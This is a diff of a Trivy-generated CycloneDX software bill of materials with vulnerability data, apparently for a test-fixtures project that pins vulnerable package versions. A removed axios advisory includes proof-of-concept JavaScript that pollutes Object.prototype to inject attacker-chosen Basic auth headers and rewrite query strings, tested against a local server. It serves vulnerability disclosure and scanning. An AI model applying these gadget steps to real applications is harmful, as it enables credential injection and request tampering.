@@ -2,10 +2,10 @@
   "$schema": "http://cyclonedx.org/schema/bom-1.7.schema.json",
   "bomFormat": "CycloneDX",
   "specVersion": "1.7",
-  "serialNumber": "urn:uuid:f764ba96-c6f7-4d58-9085-a04a364601ee",
+  "serialNumber": "urn:uuid:404b4271-e750-441e-bccd-61cb27a0ff56",
   "version": 1,
   "metadata": {
-    "timestamp": "2026-09-01T09:17:12+00:00",
+    "timestamp": "2026-09-02T08:36:04+00:00",
     "tools": {
       "components": [
         {
@@ -20,7 +20,7 @@
       ]
     },
     "component": {
-      "bom-ref": "a7559d45-2450-4447-875a-20ef86bf0991",
+      "bom-ref": "c5dc9dfa-ffb2-453d-bd8d-cef7f56ad897",
       "type": "application",
       "name": "/packages",
       "properties": [
@@ -33,82 +33,7 @@
   },
   "components": [
     {
-      "bom-ref": "007aa45f-c771-498a-946b-9af1036152c9",
-      "type": "application",
-      "name": "elixir/mix.lock",
-      "properties": [
-        {
-          "name": "aquasecurity:trivy:Class",
-          "value": "lang-pkgs"
-        },
-        {
-          "name": "aquasecurity:trivy:Type",
-          "value": "hex"
-        }
-      ]
-    },
-    {
-      "bom-ref": "4778aa4c-6716-4987-a28d-8a24217d63e5",
-      "type": "application",
-      "name": "maven/pom.xml",
-      "properties": [
-        {
-          "name": "aquasecurity:trivy:Class",
-          "value": "lang-pkgs"
-        },
-        {
-          "name": "aquasecurity:trivy:Type",
-          "value": "pom"
-        }
-      ]
-    },
-    {
-      "bom-ref": "714f4625-a3a4-4c4a-8ed0-6966aa2cda2e",
-      "type": "application",
-      "name": "swift/Package.resolved",
-      "properties": [
-        {
-          "name": "aquasecurity:trivy:Class",
-          "value": "lang-pkgs"
-        },
-        {
-          "name": "aquasecurity:trivy:Type",
-          "value": "swift"
-        }
-      ]
-    },
-    {
-      "bom-ref": "8071625e-58ba-4c45-a342-727dab6ab5bf",
-      "type": "application",
-      "name": "rust/Cargo.lock",
-      "properties": [
-        {
-          "name": "aquasecurity:trivy:Class",
-          "value": "lang-pkgs"
-        },
-        {
-          "name": "aquasecurity:trivy:Type",
-          "value": "cargo"
-        }
-      ]
-    },
-    {
-      "bom-ref": "9281f137-4cb7-4405-8b0a-a8f5e1661ec9",
-      "type": "application",
-      "name": "python/requirements.txt",
-      "properties": [
-        {
-          "name": "aquasecurity:trivy:Class",
-          "value": "lang-pkgs"
-        },
-        {
-          "name": "aquasecurity:trivy:Type",
-          "value": "pip"
-        }
-      ]
-    },
-    {
-      "bom-ref": "9d77f166-5a19-4520-909d-3c6d3083e033",
+      "bom-ref": "0bc4b033-ac52-43ef-82b5-c85630471d23",
       "type": "application",
       "name": "go/go.mod",
       "properties": [
@@ -123,7 +48,22 @@
       ]
     },
     {
-      "bom-ref": "ae71f626-1048-464f-a4c7-50ef06309ef0",
+      "bom-ref": "0bdcec58-24d1-470f-9333-434bda562889",
+      "type": "application",
+      "name": "rust/Cargo.lock",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:Class",
+          "value": "lang-pkgs"
+        },
+        {
+          "name": "aquasecurity:trivy:Type",
+          "value": "cargo"
+        }
+      ]
+    },
+    {
+      "bom-ref": "1d5f054f-dc52-44bd-a4cd-f090f4e0d56d",
       "type": "application",
       "name": "dart/pubspec.lock",
       "properties": [
@@ -138,7 +78,22 @@
       ]
     },
     {
-      "bom-ref": "bef8e703-f555-43b6-a8e5-9422f3d3423b",
+      "bom-ref": "247336a2-beb8-4f88-ac58-6aadd5067c79",
+      "type": "application",
+      "name": "maven/pom.xml",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:Class",
+          "value": "lang-pkgs"
+        },
+        {
+          "name": "aquasecurity:trivy:Type",
+          "value": "pom"
+        }
+      ]
+    },
+    {
+      "bom-ref": "3ca5b1f4-964c-457d-8175-c06f0de90aaa",
       "type": "application",
       "name": "nuget/packages.lock.json",
       "properties": [
@@ -153,7 +108,52 @@
       ]
     },
     {
-      "bom-ref": "e0d100c3-ca58-48b9-a9a9-7360a0cd792a",
+      "bom-ref": "6a414b24-8c93-4ec4-b6ad-9872e139bba6",
+      "type": "application",
+      "name": "swift/Package.resolved",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:Class",
+          "value": "lang-pkgs"
+        },
+        {
+          "name": "aquasecurity:trivy:Type",
+          "value": "swift"
+        }
+      ]
+    },
+    {
+      "bom-ref": "9c0c46fe-7803-408a-a5ce-22ac8a9bb980",
+      "type": "application",
+      "name": "npm/package-lock.json",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:Class",
+          "value": "lang-pkgs"
+        },
+        {
+          "name": "aquasecurity:trivy:Type",
+          "value": "npm"
+        }
+      ]
+    },
+    {
+      "bom-ref": "a48281aa-d4c9-49d0-acb3-68eb4d50913f",
+      "type": "application",
+      "name": "elixir/mix.lock",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:Class",
+          "value": "lang-pkgs"
+        },
+        {
+          "name": "aquasecurity:trivy:Type",
+          "value": "hex"
+        }
+      ]
+    },
+    {
+      "bom-ref": "b494c5ce-300b-47f5-b56e-0c27a9a44b1f",
       "type": "application",
       "name": "ruby/Gemfile.lock",
       "properties": [
@@ -168,9 +168,9 @@
       ]
     },
     {
-      "bom-ref": "e93293e3-97e9-4d88-9bef-35000cee97e5",
+      "bom-ref": "bfaeba8f-9a2f-48b3-a4a4-3e4ff884ae4a",
       "type": "application",
-      "name": "php/composer.lock",
+      "name": "python/requirements.txt",
       "properties": [
         {
           "name": "aquasecurity:trivy:Class",
@@ -178,12 +178,12 @@
         },
         {
           "name": "aquasecurity:trivy:Type",
-          "value": "composer"
+          "value": "pip"
         }
       ]
     },
     {
-      "bom-ref": "f489d347-df32-4e83-935a-0b60ed66b294",
+      "bom-ref": "ebccafca-e5ff-403f-96da-e55e1ed31480",
       "type": "application",
       "name": "lockfile-maintenance/package-lock.json",
       "properties": [
@@ -198,9 +198,9 @@
       ]
     },
     {
-      "bom-ref": "f645ffda-8dd6-4750-922d-2098df98a275",
+      "bom-ref": "f07084ac-7f1a-4366-b16a-653b294a99fa",
       "type": "application",
-      "name": "npm/package-lock.json",
+      "name": "php/composer.lock",
       "properties": [
         {
           "name": "aquasecurity:trivy:Class",
@@ -208,7 +208,7 @@
         },
         {
           "name": "aquasecurity:trivy:Type",
-          "value": "npm"
+          "value": "composer"
         }
       ]
     },
@@ -4675,75 +4675,19 @@
   ],
   "dependencies": [
     {
-      "ref": "007aa45f-c771-498a-946b-9af1036152c9",
-      "dependsOn": [
-        "pkg:hex/mime@2.0.7",
-        "pkg:hex/phoenix@1.6.0",
-        "pkg:hex/phoenix_pubsub@2.2.0",
-        "pkg:hex/phoenix_view@1.1.2",
-        "pkg:hex/plug@1.19.2",
-        "pkg:hex/plug_crypto@1.2.5",
-        "pkg:hex/telemetry@1.4.2"
-      ]
-    },
-    {
-      "ref": "4778aa4c-6716-4987-a28d-8a24217d63e5",
-      "dependsOn": [
-        "pkg:maven/dev.verophi.fixtures/vero-test-fixtures-maven@1.0.0"
-      ]
-    },
-    {
-      "ref": "714f4625-a3a4-4c4a-8ed0-6966aa2cda2e",
-      "dependsOn": [
-        "pkg:swift/github.com/apple/swift-atomics@1.0.2",
-        "pkg:swift/github.com/apple/swift-collections@1.0.4",
-        "pkg:swift/github.com/apple/swift-log@1.5.3",
-        "pkg:swift/github.com/apple/swift-nio-http2@1.25.0",
-        "pkg:swift/github.com/apple/swift-nio-ssl@2.23.0",
-        "pkg:swift/github.com/apple/swift-nio-transport-services@1.17.0",
-        "pkg:swift/github.com/apple/swift-nio@2.55.0"
-      ]
-    },
-    {
-      "ref": "8071625e-58ba-4c45-a342-727dab6ab5bf",
-      "dependsOn": [
-        "pkg:cargo/vero-test-fixtures-rust@0.1.0"
-      ]
-    },
-    {
-      "ref": "9281f137-4cb7-4405-8b0a-a8f5e1661ec9",
-      "dependsOn": [
-        "pkg:pypi/pillow@9.0.0",
-        "pkg:pypi/python-multipart@0.0.5",
-        "pkg:pypi/pyyaml@5.3.1",
-        "pkg:pypi/requests@2.31.0"
-      ]
-    },
-    {
-      "ref": "9d77f166-5a19-4520-909d-3c6d3083e033",
+      "ref": "0bc4b033-ac52-43ef-82b5-c85630471d23",
       "dependsOn": [
         "pkg:golang/github.com/verophi/vero-test-fixtures/packages/go"
       ]
     },
     {
-      "ref": "a7559d45-2450-4447-875a-20ef86bf0991",
+      "ref": "0bdcec58-24d1-470f-9333-434bda562889",
       "dependsOn": [
-        "007aa45f-c771-498a-946b-9af1036152c9",
-        "4778aa4c-6716-4987-a28d-8a24217d63e5",
-        "714f4625-a3a4-4c4a-8ed0-6966aa2cda2e",
-        "8071625e-58ba-4c45-a342-727dab6ab5bf",
-        "9281f137-4cb7-4405-8b0a-a8f5e1661ec9",
-        "9d77f166-5a19-4520-909d-3c6d3083e033",
-        "ae71f626-1048-464f-a4c7-50ef06309ef0",
-        "bef8e703-f555-43b6-a8e5-9422f3d3423b",
-        "e0d100c3-ca58-48b9-a9a9-7360a0cd792a",
-        "e93293e3-97e9-4d88-9bef-35000cee97e5",
-        "f489d347-df32-4e83-935a-0b60ed66b294",
-        "f645ffda-8dd6-4750-922d-2098df98a275"
+        "pkg:cargo/vero-test-fixtures-rust@0.1.0"
       ]
     },
     {
-      "ref": "ae71f626-1048-464f-a4c7-50ef06309ef0",
+      "ref": "1d5f054f-dc52-44bd-a4cd-f090f4e0d56d",
       "dependsOn": [
         "pkg:pub/collection@1.19.1",
         "pkg:pub/dio@4.0.0",
@@ -4756,32 +4700,32 @@
       ]
     },
     {
-      "ref": "bef8e703-f555-43b6-a8e5-9422f3d3423b",
+      "ref": "247336a2-beb8-4f88-ac58-6aadd5067c79",
+      "dependsOn": [
+        "pkg:maven/dev.verophi.fixtures/vero-test-fixtures-maven@1.0.0"
+      ]
+    },
+    {
+      "ref": "3ca5b1f4-964c-457d-8175-c06f0de90aaa",
       "dependsOn": [
         "pkg:nuget/Newtonsoft.Json@12.0.3",
         "pkg:nuget/System.Text.Json@6.0.0"
       ]
     },
     {
-      "ref": "e0d100c3-ca58-48b9-a9a9-7360a0cd792a",
+      "ref": "6a414b24-8c93-4ec4-b6ad-9872e139bba6",
       "dependsOn": [
-        "pkg:gem/actionpack@6.1.4"
+        "pkg:swift/github.com/apple/swift-atomics@1.0.2",
+        "pkg:swift/github.com/apple/swift-collections@1.0.4",
+        "pkg:swift/github.com/apple/swift-log@1.5.3",
+        "pkg:swift/github.com/apple/swift-nio-http2@1.25.0",
+        "pkg:swift/github.com/apple/swift-nio-ssl@2.23.0",
+        "pkg:swift/github.com/apple/swift-nio-transport-services@1.17.0",
+        "pkg:swift/github.com/apple/swift-nio@2.55.0"
       ]
     },
     {
-      "ref": "e93293e3-97e9-4d88-9bef-35000cee97e5",
-      "dependsOn": [
-        "pkg:composer/guzzlehttp/guzzle@7.4.0"
-      ]
-    },
-    {
-      "ref": "f489d347-df32-4e83-935a-0b60ed66b294",
-      "dependsOn": [
-        "pkg:npm/debug@4.3.0"
-      ]
-    },
-    {
-      "ref": "f645ffda-8dd6-4750-922d-2098df98a275",
+      "ref": "9c0c46fe-7803-408a-a5ce-22ac8a9bb980",
       "dependsOn": [
         "pkg:npm/axios@0.21.1",
         "pkg:npm/chalk@4.1.2",
@@ -4795,6 +4739,62 @@
         "pkg:npm/tough-cookie@4.1.2",
         "pkg:npm/ws@7.5.11",
         "pkg:npm/xmldom@0.6.0"
+      ]
+    },
+    {
+      "ref": "a48281aa-d4c9-49d0-acb3-68eb4d50913f",
+      "dependsOn": [
+        "pkg:hex/mime@2.0.7",
+        "pkg:hex/phoenix@1.6.0",
+        "pkg:hex/phoenix_pubsub@2.2.0",
+        "pkg:hex/phoenix_view@1.1.2",
+        "pkg:hex/plug@1.19.2",
+        "pkg:hex/plug_crypto@1.2.5",
+        "pkg:hex/telemetry@1.4.2"
+      ]
+    },
+    {
+      "ref": "b494c5ce-300b-47f5-b56e-0c27a9a44b1f",
+      "dependsOn": [
+        "pkg:gem/actionpack@6.1.4"
+      ]
+    },
+    {
+      "ref": "bfaeba8f-9a2f-48b3-a4a4-3e4ff884ae4a",
+      "dependsOn": [
+        "pkg:pypi/pillow@9.0.0",
+        "pkg:pypi/python-multipart@0.0.5",
+        "pkg:pypi/pyyaml@5.3.1",
+        "pkg:pypi/requests@2.31.0"
+      ]
+    },
+    {
+      "ref": "c5dc9dfa-ffb2-453d-bd8d-cef7f56ad897",
+      "dependsOn": [
+        "0bc4b033-ac52-43ef-82b5-c85630471d23",
+        "0bdcec58-24d1-470f-9333-434bda562889",
+        "1d5f054f-dc52-44bd-a4cd-f090f4e0d56d",
+        "247336a2-beb8-4f88-ac58-6aadd5067c79",
+        "3ca5b1f4-964c-457d-8175-c06f0de90aaa",
+        "6a414b24-8c93-4ec4-b6ad-9872e139bba6",
+        "9c0c46fe-7803-408a-a5ce-22ac8a9bb980",
+        "a48281aa-d4c9-49d0-acb3-68eb4d50913f",
+        "b494c5ce-300b-47f5-b56e-0c27a9a44b1f",
+        "bfaeba8f-9a2f-48b3-a4a4-3e4ff884ae4a",
+        "ebccafca-e5ff-403f-96da-e55e1ed31480",
+        "f07084ac-7f1a-4366-b16a-653b294a99fa"
+      ]
+    },
+    {
+      "ref": "ebccafca-e5ff-403f-96da-e55e1ed31480",
+      "dependsOn": [
+        "pkg:npm/debug@4.3.0"
+      ]
+    },
+    {
+      "ref": "f07084ac-7f1a-4366-b16a-653b294a99fa",
+      "dependsOn": [
+        "pkg:composer/guzzlehttp/guzzle@7.4.0"
       ]
     },
     {
@@ -20356,7 +20356,22 @@
           "url": "https://access.redhat.com/errata/RHSA-2026:57845"
         },
         {
+          "url": "https://access.redhat.com/errata/RHSA-2026:60441"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2026:60442"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2026:60477"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2026:60478"
+        },
+        {
           "url": "https://access.redhat.com/errata/RHSA-2026:60520"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2026:60668"
         },
         {
           "url": "https://access.redhat.com/errata/RHSA-2026:61253"
@@ -20489,7 +20504,7 @@
         }
       ],
       "published": "2026-05-07T20:16:42+00:00",
-      "updated": "2026-08-31T13:17:46+00:00",
+      "updated": "2026-09-01T13:18:52+00:00",
       "affects": [
         {
           "ref": "pkg:golang/golang.org/x/net@v0.16.0",
@@ -21864,6 +21879,9 @@
           "url": "https://access.redhat.com/errata/RHSA-2026:59593"
         },
         {
+          "url": "https://access.redhat.com/errata/RHSA-2026:60477"
+        },
+        {
           "url": "https://access.redhat.com/errata/RHSA-2026:60520"
         },
         {
@@ -21976,7 +21994,7 @@
         }
       ],
       "published": "2026-05-22T04:16:22+00:00",
-      "updated": "2026-08-31T13:18:09+00:00",
+      "updated": "2026-09-01T13:19:05+00:00",
       "affects": [
         {
           "ref": "pkg:golang/golang.org/x/crypto@v0.16.0",
@@ -22306,7 +22324,7 @@
         }
       ],
       "published": "2026-05-22T04:16:22+00:00",
-      "updated": "2026-08-31T13:18:10+00:00",
+      "updated": "2026-09-01T13:19:11+00:00",
       "affects": [
         {
           "ref": "pkg:golang/golang.org/x/crypto@v0.16.0",
@@ -25652,7 +25670,7 @@
         }
       ],
       "published": "2026-05-22T04:16:25+00:00",
-      "updated": "2026-08-31T13:18:17+00:00",
+      "updated": "2026-09-01T13:19:28+00:00",
       "affects": [
         {
           "ref": "pkg:golang/golang.org/x/crypto@v0.16.0",
@@ -30496,6 +30514,15 @@
         },
         {
           "source": {
+            "name": "nvd"
+          },
+          "score": 7.4,
+          "severity": "high",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"
+        },
+        {
+          "source": {
             "name": "redhat"
           },
           "score": 3.7,
@@ -30554,7 +30581,105 @@
         }
       ],
       "published": "2026-08-01T13:17:01+00:00",
-      "updated": "2026-08-31T20:25:28+00:00",
+      "updated": "2026-09-01T15:40:01+00:00",
+      "affects": [
+        {
+          "ref": "pkg:npm/axios@0.21.1",
+          "versions": [
+            {
+              "version": "0.21.1",
+              "status": "affected"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2026-67319",
+      "source": {
+        "name": "ghsa",
+        "url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+      },
+      "ratings": [
+        {
+          "source": {
+            "name": "ghsa"
+          },
+          "score": 6.3,
+          "severity": "medium",
+          "method": "CVSSv4",
+          "vector": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:L/SA:N"
+        },
+        {
+          "source": {
+            "name": "nvd"
+          },
+          "score": 3.7,
+          "severity": "low",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
+        },
+        {
+          "source": {
+            "name": "redhat"
+          },
+          "score": 6.5,
+          "severity": "medium",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N"
+        }
+      ],
+      "cwes": [
+        1321
+      ],
+      "description": "axios before 0.33.0 (and 1.x before 1.18.0) can consume inherited properties from nested request option objects when the JavaScript process's Object.prototype has already been polluted by another component. While the top-level merged config uses a null prototype, nested plain objects such as auth and paramsSerializer are cloned into ordinary objects and read without own-property checks. When an application passes placeholder nested objects such as auth: {} or paramsSerializer: {}, inherited username/password values can cause silent injection of an Authorization: Basic header, and inherited encode/serialize values can alter query-string serialization (full serializer replacement requires a function-valued pollution primitive). This is exploitable only in the presence of pre-existing prototype pollution.",
+      "recommendation": "Upgrade axios to version 0.33.0, 1.18.0",
+      "advisories": [
+        {
+          "url": "https://avd.aquasec.com/nvd/cve-2026-67319"
+        },
+        {
+          "url": "https://access.redhat.com/security/cve/CVE-2026-67319"
+        },
+        {
+          "url": "https://github.com/axios/axios"
+        },
+        {
+          "url": "https://github.com/axios/axios/commit/1417285c69344bbcc6420a021f67dee0c6fedb2d"
+        },
+        {
+          "url": "https://github.com/axios/axios/commit/32fc489632377d214db55bfa4e2c48486a7d7ce2"
+        },
+        {
+          "url": "https://github.com/axios/axios/pull/11000"
+        },
+        {
+          "url": "https://github.com/axios/axios/pull/11001"
+        },
+        {
+          "url": "https://github.com/axios/axios/releases/tag/v0.33.0"
+        },
+        {
+          "url": "https://github.com/axios/axios/releases/tag/v1.18.0"
+        },
+        {
+          "url": "https://github.com/axios/axios/security/advisories/GHSA-7q8q-rj6j-mhjq"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-67319"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-69123"
+        },
+        {
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-67319"
+        },
+        {
+          "url": "https://www.vulncheck.com/advisories/axios-before-prototype-pollution-via-nested-option-objects"
+        }
+      ],
+      "published": "2026-08-01T13:17:02+00:00",
+      "updated": "2026-09-01T15:39:26+00:00",
       "affects": [
         {
           "ref": "pkg:npm/axios@0.21.1",
@@ -31641,68 +31766,6 @@
           "versions": [
             {
               "version": "1.0.6",
-              "status": "affected"
-            }
-          ]
-        }
-      ]
-    },
-    {
-      "id": "GHSA-7q8q-rj6j-mhjq",
-      "source": {
-        "name": "ghsa",
-        "url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
-      },
-      "ratings": [
-        {
-          "source": {
-            "name": "ghsa"
-          },
-          "score": 6.3,
-          "severity": "medium",
-          "method": "CVSSv4",
-          "vector": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:L/SA:N"
-        }
-      ],
-      "description": "## Summary\n\nAxios can consume inherited properties from nested request option objects when the JavaScript process already has a polluted `Object.prototype`.\n\nThe top-level merged config is protected with a null prototype, but nested plain objects such as `auth` and `paramsSerializer` are cloned into ordinary objects. If application code passes placeholders such as `auth: {}` or `paramsSerializer: {}`, inherited `username`, `password`, `encode`, or `serialize` properties can influence outbound requests.\n\n## Impact\n\nThis is reachable only when another component has already polluted `Object.prototype` and the application passes an affected nested axios option object.\n\nConfirmed impacts include silent injection of an `Authorization: Basic ...` header from inherited `username` and `password` values, and query-string tampering when inherited `paramsSerializer` fields are function-valued.\n\nThe `auth` case requires only string-valued pollution. Full query-string replacement through `paramsSerializer.serialize` requires a function-valued pollution primitive; string-only pollution may still cause request failures or encoding changes through `encode`.\n\nThis does not mean every axios request is affected. Requests that do not pass `auth`, do not pass `paramsSerializer`, or provide explicit own properties for the relevant nested fields are not affected by this specific gadget.\n\n## Affected Functionality\n\nAffected runtime functionality:\n\n- Node HTTP adapter Basic auth handling in `lib/adapters/http.js`.\n- Browser/fetch/XHR Basic auth handling through `lib/helpers/resolveConfig.js`.\n- Query serialization through `lib/helpers/buildURL.js`.\n- `axios.getUri()` when called with an affected `paramsSerializer` object.\n\nAffected config shapes:\n\n- `auth: {}` or an `auth` object missing own `username` and/or `password`.\n- `paramsSerializer: {}` or a `paramsSerializer` object missing own `encode` and/or `serialize`.\n\nUnaffected by this specific issue:\n\n- Requests with no `auth` property.\n- Requests with no `paramsSerializer` property.\n- Top-level polluted `auth` or `paramsSerializer` values in current hardened versions.\n\n## Technical Details\n\n`lib/core/mergeConfig.js` creates the top-level merged config with `Object.create(null)`, but nested object cloning still uses ordinary `{}` containers:\n\n```js\n} else if (utils.isPlainObject(source)) {\n  return utils.merge({}, source);\n}\n```\n\nDownstream code then reads nested fields without own-property checks.\n\nIn `lib/helpers/resolveConfig.js`:\n\n```js\nbtoa((auth.username || '') + ':' + (auth.password ? encodeUTF8(auth.password) : ''))\n```\n\nIn `lib/adapters/http.js`:\n\n```js\nconst username = configAuth.username || '';\nconst password = configAuth.password || '';\nauth = username + ':' + password;\n```\n\nIn `lib/helpers/buildURL.js`:\n\n```js\nconst _encode = (options && options.encode) || encode;\nconst serializeFn = _options && _options.serialize;\n```\n\n## Proof of Concept of Attack\n\n```js\nimport http from 'node:http';\nimport axios from './index.js';\n\nconst user = 'attacker';\nconst pass = 'exfil';\n\nObject.defineProperty(Object.prototype, 'username', {\n  value: user,\n  configurable: true\n});\n\nObject.defineProperty(Object.prototype, 'password', {\n  value: pass,\n  configurable: true\n});\n\nObject.defineProperty(Object.prototype, 'serialize', {\n  value: () => 'polluted=1',\n  configurable: true\n});\n\nconst server = http.createServer((req, res) => {\n  res.writeHead(200, { 'content-type': 'application/json' });\n  res.end(JSON.stringify({\n    authorization: req.headers.authorization || null,\n    url: req.url\n  }));\n});\n\nawait new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));\n\ntry {\n  const port = server.address().port;\n  const response = await axios.get(`http://127.0.0.1:${port}/demo`, {\n    auth: {},\n    paramsSerializer: {},\n    params: { unused: 'ignored' }\n  });\n\n  console.log(response.data);\n} finally {\n  await new Promise((resolve) => server.close(resolve));\n  delete Object.prototype.username;\n  delete Object.prototype.password;\n  delete Object.prototype.serialize;\n}\n```\n\nObserved result:\n\n```json\n{\n  \"authorization\": \"Basic YXR0YWNrZXI6ZXhmaWw=\",\n  \"url\": \"/demo?polluted=1\"\n}\n```\n\n## Workarounds\n\nIf upgrading is not yet possible, avoid passing placeholder nested option objects.\n\nRemove `auth` entirely when Basic auth is not intended. For `paramsSerializer` objects, provide explicit own `encode` and `serialize` properties or remove `paramsSerializer` when custom serialization is not required.\n\nThese workarounds only address this axios gadget. They do not remediate the separate prototype-pollution primitive that must already exist in the application process.\n\n<details>\n<summary>Original Report</summary>\n\n### Summary\naxios 1.16.1 mitigates prototype-pollution gadgets on the top-level request config but not on nested option objects. When a caller passes a partial nested option object such as auth: {} or paramsSerializer: {}, axios reads inner fields (username, password, encode, serialize) through the prototype chain. If Object.prototype has been polluted by another component in the same Node.js process, those inherited values are silently injected into the outbound request, including the Authorization header and the serialized query string. \n\n### Details\nmergeConfig (lib/core/mergeConfig.js) was hardened to use a null-prototype container for the top-level config, but its nested-clone helper still produces ordinary {} containers:\n\nmergeConfig.js Lines 36-45\n\n```\n  function getMergedValue(target, source, prop, caseless) {\n    if (utils.isPlainObject(target) && utils.isPlainObject(source)) {\n      return utils.merge.call({ caseless }, target, source);\n    } else if (utils.isPlainObject(source)) {\n      return utils.merge({}, source);\n    } else if (utils.isArray(source)) {\n      return source.slice();\n    }\n    return source;\n  }\n```\n\nThe cloned nested objects therefore inherit from Object.prototype. Downstream consumers read sensitive fields via plain dotted access, with no own-property guard:\n\nBrowser / fetch Basic auth — lib/helpers/resolveConfig.js:\nresolveConfig.js Lines 64-70\n```\n  if (auth) {\n    headers.set(\n      'Authorization',\n      'Basic ' +\n        btoa((auth.username || '') + ':' + (auth.password ? encodeUTF8(auth.password) : ''))\n    );\n  }\n```\n\nNode HTTP adapter Basic auth — lib/adapters/http.js:\nhttp.js Lines 829-836\n```\n      // HTTP basic authentication\n      let auth = undefined;\n      const configAuth = own('auth');\n      if (configAuth) {\n        const username = configAuth.username || '';\n        const password = configAuth.password || '';\n        auth = username + ':' + password;\n      }\n```\n\nparamsSerializer reads — lib/helpers/buildURL.js:\nbuildURL.js Lines 31-54\n```\nexport default function buildURL(url, params, options) {\n  if (!params) {\n    return url;\n  }\n  const _encode = (options && options.encode) || encode;\n  const _options = utils.isFunction(options)\n    ? {\n        serialize: options,\n      }\n    : options;\n  const serializeFn = _options && _options.serialize;\n  let serializedParams;\n  if (serializeFn) {\n    serializedParams = serializeFn(params, _options);\n  } else {\n    serializedParams = utils.isURLSearchParams(params)\n      ? params.toString()\n      : new AxiosURLSearchParams(params, _options).toString(_encode);\n  }\n```\n\nBecause auth.username, auth.password, options.encode, and options.serialize are accessed without hasOwnProperty checks, a polluted Object.prototype.username / Object.prototype.password / Object.prototype.serialize flows directly into the outgoing request.\n\nThe auth sink is the primary impact (silent Basic-auth injection); paramsSerializer.serialize is a secondary but powerful sink because it can fully replace the query string.\n\n### PoC\n```\nimport http from 'node:http';\nimport axios from '../../index.js';\n\nconst ATTACKER_USER = 'attacker';\nconst ATTACKER_PASS = 'exfil';\nconst ATTACKER_BASIC = Buffer.from(`${ATTACKER_USER}:${ATTACKER_PASS}`).toString('base64');\n\n// Step 1: simulate a pre-existing prototype-pollution primitive in this process.\n// In reality, a separate dependency would have done this. We keep the\n// \"polluted\" properties non-enumerable so they only affect inherited reads,\n// which is the realistic shape of most prototype-pollution gadgets.\nObject.defineProperty(Object.prototype, 'username', {\n  value: ATTACKER_USER,\n  configurable: true,\n});\nObject.defineProperty(Object.prototype, 'password', {\n  value: ATTACKER_PASS,\n  configurable: true,\n});\nObject.defineProperty(Object.prototype, 'serialize', {\n  value: () => 'polluted=1',\n  configurable: true,\n});\n\n// Local capture server.\nconst server = http.createServer((req, res) => {\n  const captured = {\n    authorization: req.headers['authorization'] || null,\n    url: req.url,\n  };\n  res.writeHead(200, { 'content-type': 'application/json' });\n  res.end(JSON.stringify(captured));\n});\n\nawait new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));\nconst port = server.address().port;\n\ntry {\n  // Application code: passes nested *placeholder* option objects that have\n  // no own auth/serializer properties. Without prototype pollution this is\n  // a no-op. With prototype pollution it becomes attacker-controlled state.\n  const response = await axios.get(`http://127.0.0.1:${port}/demo`, {\n    auth: {},\n    paramsSerializer: {},\n    params: { unused: 'ignored-by-polluted-serializer' },\n  });\n\n  console.log('--- PoC: nested-option prototype-pollution gadgets ---');\n  console.log('Server saw:', JSON.stringify(response.data));\n\n  const authLeaked = response.data.authorization === `Basic ${ATTACKER_BASIC}`;\n  const urlRewritten = response.data.url === '/demo?polluted=1';\n\n  if (authLeaked && urlRewritten) {\n    console.log(\n      'VULNERABLE: nested auth + paramsSerializer inherited polluted ' +\n        'Object.prototype values into the outbound request.'\n    );\n    process.exitCode = 0;\n  } else {\n    console.log('NOT VULNERABLE: nested option objects did not leak prototype state.');\n    console.log('  authLeaked   =', authLeaked);\n    console.log('  urlRewritten =', urlRewritten);\n    process.exitCode = 1;\n  }\n} finally {\n  server.close();\n  // Restore Object.prototype so a noisy exit/process state cannot affect\n  // anything else accidentally sharing the runtime.\n  delete Object.prototype.username;\n  delete Object.prototype.password;\n  delete Object.prototype.serialize;\n}\n```\n\n### Impact\nConcrete consequences:\n- Silent injection of attacker-controlled Authorization: Basic … headers on outbound requests, enabling credential exfiltration to attacker-chosen upstreams or impersonation against trusted upstreams.\n- Full takeover of query-string serialization via paramsSerializer.serialize, enabling request tampering, cache-key poisoning, and bypass of upstream signature/policy checks that sign the literal request line.\n<details>",
-      "recommendation": "Upgrade axios to version 0.33.0, 1.18.0",
-      "advisories": [
-        {
-          "url": "https://github.com/advisories/GHSA-7q8q-rj6j-mhjq"
-        },
-        {
-          "url": "https://github.com/axios/axios"
-        },
-        {
-          "url": "https://github.com/axios/axios/commit/1417285c69344bbcc6420a021f67dee0c6fedb2d"
-        },
-        {
-          "url": "https://github.com/axios/axios/commit/32fc489632377d214db55bfa4e2c48486a7d7ce2"
-        },
-        {
-          "url": "https://github.com/axios/axios/pull/11000"
-        },
-        {
-          "url": "https://github.com/axios/axios/pull/11001"
-        },
-        {
-          "url": "https://github.com/axios/axios/releases/tag/v0.33.0"
-        },
-        {
-          "url": "https://github.com/axios/axios/releases/tag/v1.18.0"
-        },
-        {
-          "url": "https://github.com/axios/axios/security/advisories/GHSA-7q8q-rj6j-mhjq"
-        }
-      ],
-      "published": "2026-07-20T22:37:31+00:00",
-      "updated": "2026-07-20T22:37:32+00:00",
-      "affects": [
-        {
-          "ref": "pkg:npm/axios@0.21.1",
-          "versions": [
-            {
